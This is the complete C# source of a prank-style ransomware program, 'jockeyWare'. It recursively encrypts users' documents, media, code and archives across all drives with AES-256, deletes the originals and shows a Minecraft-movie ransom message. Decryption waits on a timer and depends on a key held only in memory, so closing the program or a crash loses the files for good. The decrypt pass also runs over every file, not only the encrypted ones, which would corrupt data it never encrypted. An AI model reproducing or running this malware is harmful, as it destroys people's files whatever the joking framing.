using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Timers;

namespace jockeyWare
{
	internal class Program
	{
		// File extensions rensenware searches for
		private static readonly string[] targetExtensions = new string[]
		{
			".jpg",  ".txt",
			".png",  ".pdf",
			".hwp",  ".psd",
			".cs",   ".c",
			".cpp",  ".vb",
			".bas",  ".frm",
			".mp3",  ".wav",
			".flac", ".gif",
			".doc",  ".xls",
			".xlsx", ".docx",
			".ppt",  ".pptx",
			".js",   ".avi",
			".mp4",  ".mkv",
			".zip",  ".rar",
			".alz",  ".egg",
			".7z",   ".raw",
			".csv",  ".wma"
		};

		internal static List<string> encryptedFiles = new List<string>();
		
		internal static byte[] randomKey { get; set; }
		internal static readonly string KeyFilePath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\randomkey.bin";

		internal static byte[] randomIV  { get; set; }
		internal static readonly string IVFilePath  = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\randomiv.bin";

		[STAThread]
		private static void Main()
		{
		    	Program.randomIV  = new byte[16];
			Program.randomKey = new byte[32];
			
			RNGCryptoServiceProvider rngcryptoServiceProvider = new RNGCryptoServiceProvider();
			rngcryptoServiceProvider.GetBytes(Program.randomIV);  // Generate the IV
			rngcryptoServiceProvider.GetBytes(Program.randomKey); // Generate the key
			
			string[] logicalDrives = Environment.GetLogicalDrives();
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.System);
			foreach (string zeDrive in logicalDrives)
			{
				if (folderPath.Contains(zeDrive)) // Check if the drive has the windows system folder
				{	// We are most likely a windows drive, search the user's profile folder
					foreach (string path in Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\.."))
					{
						try
						{
							foreach (string fileName in Directory.GetFiles(path, "*.*", SearchOption.AllDirectories))
							{
								foreach (string fileExt in Program.targetExtensions)
								{
									if (fileName.EndsWith(fileExt))
									{   // Encrypt the file
										Program.Crypt(fileName, false);
										Program.encryptedFiles.Add(fileName + ".CHICKENJOCKEY");
									}
								}
							}
						}
						catch
						{
						}
					}
				}
				else
				{
					foreach (string fileName in Directory.GetFiles(zeDrive))
					{
						try
						{
							foreach (string fileExt in Program.targetExtensions)
							{
								if (fileName.EndsWith(fileExt))
								{   // Encrypt the file
									Program.Crypt(fileName, false);
									Program.encryptedFiles.Add(fileName + ".CHICKENJOCKEY");
								}
							}
						}
						catch
						{
						}
					}

					// Search folders
					foreach (string zeFolders in Directory.GetDirectories(zeDrive))
					{
						try
						{
							foreach (string fileName in Directory.GetFiles(zeFolders, "*.*", SearchOption.AllDirectories))
							{
								foreach (string fileExt in Program.targetExtensions)
								{
									if (fileName.EndsWith(fileExt))
									{   // Encrypt the file
										Program.Crypt(fileName, false);
										Program.encryptedFiles.Add(fileName + ".CHICKENJOCKEY");
									}
								}
							}
						}
						catch
						{
						}
					}
				}
			}
			
			Console.WriteLine("Hello. I'm Steve and i just encrypted all your personal files!\nWatch \"A Minecraft Movie\" until the part where I yell \"CHICKEN JOCKEY!\" for me to decrypt them.");
			Console.WriteLine("Since I can't provide my own movie with this for bullshit reasons I'll set a timer and trust that you're gonna watch the minecraft movie while you wait.\nWhen the timer reaches zero (chicken jockey scene) your files will be decrypted.");
			Console.Write("Press any key to start the timer. ");
			Console.ReadKey();

			timmyr = new Timer(1000);
			timmyr.AutoReset = true;
			timmyr.Elapsed += onTimerElapse;
			timmyr.Start();
			Console.ReadLine();
		}

                public static UInt16 countdown = 4168;
                public static Timer timmyr;

                static void onTimerElapse(Object source, System.Timers.ElapsedEventArgs e)
                {
                        countdown--;
                        if(countdown < 1)
                        {
                                Console.WriteLine("CHICKEN JOCKEY!!!!!!");
                                timmyr.Stop();
                                Console.WriteLine("Your files are now being decrypted. Please wait...");
			
                                // This is the same code as the encryptor from Main() except i changed it up a bit to decrypt instead.
                                string[] logicalDrives = Environment.GetLogicalDrives();
                                string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.System);
                                foreach (string zeDrive in logicalDrives)
                                {
				        if (folderPath.Contains(zeDrive))
				        {
					        foreach (string path in Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\.."))
					        {
        						try
	        					{
		        					foreach (string fileName in Directory.GetFiles(path, "*.*", SearchOption.AllDirectories))
			        				{
				        				Program.Crypt(fileName, true);
					        		}
						        }
        						catch
	        					{
		        				}
			        		}
				        }
        				else
	        			{
		        			foreach (string fileName in Directory.GetFiles(zeDrive))
			        		{
				        		try
					        	{
						                Program.Crypt(fileName, true);
        						}
	        					catch
		        				{
			        			}
				        	}

        					// Search folders
	        				foreach (string zeFolders in Directory.GetDirectories(zeDrive))
		        			{
			        			try
				        		{
					        	        foreach (string fileName in Directory.GetFiles(zeFolders, "*.*", SearchOption.AllDirectories))
						        	{
							                Program.Crypt(fileName, true);
        							}
	        					}
		        				catch
			        			{
				        		}
					        }
        				}
                                }

                                Console.WriteLine("Your files have been successfully decrypted!\nPress any key to exit.");
                                Console.ReadKey();
                                Environment.Exit(0);
                        }
                        else
                        {
                                TimeSpan timelapsed = TimeSpan.FromSeconds(4168 - countdown);
                                TimeSpan timeleft = TimeSpan.FromSeconds(countdown);
	                        Console.WriteLine("\nTime elapsed: " + timelapsed.ToString(@"hh\:mm\:ss"));
	                        Console.WriteLine("Time left: " + timeleft.ToString(@"hh\:mm\:ss"));
		        }
		}

		internal static void Crypt(string path, bool IsDecrypt = false)
		{
			using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
			{
				rijndaelManaged.IV          = Program.randomIV;
				rijndaelManaged.Key         = Program.randomKey;
				rijndaelManaged.KeySize     = 256;               // AES-256
				rijndaelManaged.BlockSize   = 128;
				rijndaelManaged.Mode        = CipherMode.CBC;    // CBC mode
				rijndaelManaged.Padding     = PaddingMode.PKCS7;

				ICryptoTransform transform = IsDecrypt ? rijndaelManaged.CreateDecryptor(Program.randomKey, Program.randomIV) : rijndaelManaged.CreateEncryptor(Program.randomKey, Program.randomIV);
				using (MemoryStream memoryStream = new MemoryStream())
				{
					using (CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Write))
					{
						byte[] fileData = File.ReadAllBytes(path);
						if ((long)fileData.Length >= 2147483647L) // 2 GB
						{
							while (cryptoStream.Position != (long)fileData.Length - 1L)
							{
								cryptoStream.Write(fileData, 0, 1);
							}
						}
						else
						{
							cryptoStream.Write(fileData, 0, fileData.Length);
						}
					}
                    
					// Create a seperate encrypted file, and delete the original one.
					File.WriteAllBytes(IsDecrypt ? path.Replace(".CHICKENJOCKEY", string.Empty) : (path + ".CHICKENJOCKEY"), memoryStream.ToArray());
					File.Delete(path);
				}
			}
		}
	}
}
